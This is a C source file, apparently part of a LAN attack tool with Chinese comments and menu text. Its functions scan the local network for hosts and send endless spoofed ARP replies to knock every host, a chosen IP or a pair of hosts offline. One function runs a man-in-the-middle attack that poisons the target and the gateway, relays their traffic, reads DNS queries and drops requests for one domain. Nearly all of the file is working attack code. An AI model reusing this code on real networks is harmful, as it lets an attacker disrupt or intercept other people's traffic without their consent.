/*===============================================================
*   Copyright (C) 2017 All rights reserved.
*   
*   文件名称：function.c
*   创 建 者：陈迪林
*   创建日期：2017年07月26日
*   描    述：
*
*   更新日志：
*
================================================================*/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <pthread.h>

#include "socket.h"

unsigned char cheat_mac[6] = {0x0f,0x0f,0x29,0x34,0x4d,0xef};

int one()
{
	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	int i;
	struct in_addr inaddr;
	printf("查找主机中.....\n");
	if(-1 == find_host(mac, ip, &size))
		return -1;
	for(i=0;i<size;i++)
	{
		inaddr.s_addr = ip[i];
		char *p =  inet_ntoa(inaddr);
		if(mac[i][0] == 0x00 && mac[i][1] == 0x0c && mac[i][2] == 0x29)
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x  Vmware mac address.\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
		else
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
	}
	printf("发现%d台主机.\n",size);
}

int two()
{
	printf("[1]局域网所有主机断网.\n");
	printf("[2]指定IP断网.\n");
	printf("[3]断开两台主机..\n");
	printf(".................................  ");
	printf("选择功能:");
	int option;
	scanf("%d",&option);
	if(option == 1)
	{			
		int ip[255]={0};
		unsigned char mac[255][6];
		int size;
		if(-1 == find_host(mac, ip, &size))
			return -1;
		int i;
		int gateway = getgateway();
		ARPFRAME arpdat;
		int cnt = 0;
		while(1)
		{		
			for(i=0;i<size;i++)
			{
				fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, gateway, ip[i]);
				send_data(&arpdat, sizeof arpdat);
				usleep(200000); /* delay 100ms */
			}
			cnt += size;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 2)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标ip:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		int gateway = getgateway();
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, gateway, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 3)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标IP1:");
		scanf("%s",p);
		int srcip = inet_addr(p);
		printf("...................................  ");
		printf("目标IP2:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, srcip, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else
	{
		printf("输入错误.\n");
	}
}

static void *p_send_data(void *data)
{
	while(1)
	{
		send_data(data, 42);
		usleep(4000000);
	}
}

int three()
{	
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);
	unsigned char *dst_host = (unsigned char *)&dstip;
	unsigned char localmac[6],dstmac[6],gatewaymac[6];

	getlocalmac(localmac);

	int gateway = getgateway();
    struct in_addr inaddr;
    inaddr.s_addr = gateway;
    char *gateway_ip = inet_ntoa(inaddr); /* 获得网关MAC地址 */

	if(-1 == getmacbyip(target_ip,dstmac))
		return -1;
	if(-1 == getmacbyip(gateway_ip,gatewaymac))
		return -1;
	
    ARPFRAME arpdat,arpdat2;
    
	fill_arp_frame(&arpdat2, 2, gatewaymac, localmac, dstip, gateway);/* 欺骗网关 */
	fill_arp_frame(&arpdat, 2, dstmac, localmac, gateway, dstip);/* 欺骗目标主机 */
	
	int sock;	
	if((sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
			perror("socket create error");
			return -1;
	}

	struct sockaddr_ll toaddr;
	struct ifreq ifr;
	bzero(&toaddr,sizeof(toaddr));
	bzero(&ifr,sizeof(ifr));
	strcpy(ifr.ifr_name, IF_NAME); /*用于获取IF_NAME网卡索引*/

	if(-1 == ioctl(sock,SIOCGIFINDEX,&ifr))/**/
	{
		perror("get dev index error");
		return -1;
	}
	toaddr.sll_ifindex = ifr.ifr_ifindex; /* 网卡索引 发送和接收数据时需要用到网卡的索引 */
	toaddr.sll_family = PF_PACKET; /* 获取数据链路层数据 */

	unsigned char recv_buff[5000];
	pthread_t t,t1;
	pthread_create(&t, NULL, p_send_data, &arpdat); /* 开启一个线程用于dsthost欺骗 */
	pthread_create(&t1, NULL, p_send_data, &arpdat2); /* 开启一个线程用于gateway欺骗 */

    u16 _arp;
    u16 _ipv4;
    u16 _dns_port;
    _ipv4 = htons(ipv4_prot);
    _arp = htons(arp_prot);
    _dns_port = htons(dns);
    
	unsigned char i = 0;
    int send_enable = 1;
   // printf("_port:%04x\n",_dns_port);
	while(1)
	{
		int n = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
        
        ip_datagram *ip = (ip_datagram *)recv_buff;
        send_enable = 1;
        
        /* 收到目标主机发送至网关的数据帧 */
        if(ip->iphdr.srcip == dstip)
        {
	        if(ip->ethhdr.type == _ipv4)
	        {
                if(ip->iphdr.protocol == udp_prot) /* UDP */
                {
                    udp_datagram *udp = (udp_datagram *)recv_buff;
                    if(udp->udphdr.dstport == _dns_port) /* DNS服务 */
                    {
                        //send_enable = 0;
                        char domain[100] = {0};
                        char *pdomain = domain;
                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
                        int tlength = (int)dnsframe->tlength;
                        int dlength = tlength;
                        char *p = dnsframe->domain;
                        while(tlength)
                        {
                            *pdomain = *p;
                            p++;
                            pdomain++;
                            tlength--;
                        }

                        *pdomain = '.';
                        tlength = (int)(*p);
                        p++;
                        pdomain++;
                        while(tlength)
                        {
                            *pdomain = *p;
                            p++;
                            pdomain++;
                            tlength--;
                        }
                        
                        *pdomain = 0;
                        tlength = (int)(*p);
                        p++;
                        pdomain++;
                        while(tlength)
                        {
                            *pdomain = *p;
                            p++;
                            pdomain++;
                            tlength--;
                        }
                        printf("%s\n",domain+dlength+1);
                        if(0 == strcmp(domain+dlength+1, "csdn"))
                        {
                        	send_enable = 0;
                        }

                    }
                }
	            // printf("**************dst->gateway**************\n");
	            // printf("recv %d byte data\n",n);
	            // printf("srcmac:%02x:%02x:%02x:%02x:%02x:%02x,  ",\
	                    // recv_buff[6],recv_buff[7],recv_buff[8],\
	                    // recv_buff[9],recv_buff[10],recv_buff[11]);
	            // printf("dstmac:%02x:%02x:%02x:%02x:%02x:%02x\n",\
	                    // recv_buff[0],recv_buff[1],recv_buff[2],\
	                    // recv_buff[3],recv_buff[4],recv_buff[5]);
	            
	            // printf("srcip:%d.%d.%d.%d,  ",\
	                    // recv_buff[26],recv_buff[27],recv_buff[28],\
	                    // recv_buff[29]);
	            // printf("dstip:%d.%d.%d.%d\n\n",\
	                    // recv_buff[30],recv_buff[31],recv_buff[32],\
	                    // recv_buff[33]);
	            if(1 == send_enable)
                {
                    memcpy(recv_buff,gatewaymac,6);/* 修改数据包中元mac地址为本机mac，目标mac为网关mac */
                    memcpy(recv_buff+6,localmac,6);
                    if(n != sendto(sock, recv_buff, n, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
                    {
                        perror("send error");
                    } 
                }
	        }
        }
        
        /* 收到网关发送至目标主机的数据帧 */
        
        if(ip->iphdr.dstip == dstip)
        {
            // printf("**************gateway->dst**************\n");
            // printf("recv %d byte data\n",n);
            // printf("srcmac:%02x:%02x:%02x:%02x:%02x:%02x,  ",\
                    // recv_buff[6],recv_buff[7],recv_buff[8],\
                    // recv_buff[9],recv_buff[10],recv_buff[11]);
            // printf("dstmac:%02x:%02x:%02x:%02x:%02x:%02x\n",\
                    // recv_buff[0],recv_buff[1],recv_buff[2],\
                    // recv_buff[3],recv_buff[4],recv_buff[5]);
            
            // printf("srcip:%d.%d.%d.%d,  ",\
                    // recv_buff[26],recv_buff[27],recv_buff[28],\
                    // recv_buff[29]);
            // printf("dstip:%d.%d.%d.%d\n\n",\
                    // recv_buff[30],recv_buff[31],recv_buff[32],\
                    // recv_buff[33]);

            memcpy(recv_buff,dstmac,6);
            memcpy(recv_buff+6,localmac,6);
            if(n != sendto(sock, recv_buff, n, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
            {
                perror("send error");
            } 
        }
        
    }
}


int four()
{
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);

	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	if(-1 == find_host(mac, ip, &size))
			return -1;
	int i;

	ARPFRAME arpdat;
	int cnt = 0;
	while(1)
	{		
		for(i=0;i<size;i++)
		{
			fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, dstip, ip[i]);
			send_data(&arpdat, sizeof arpdat);
			usleep(200000); /* delay 100ms */
		}
		cnt += size;
		printf(">发送第%d个欺骗数据包.\n",cnt);
	}
}



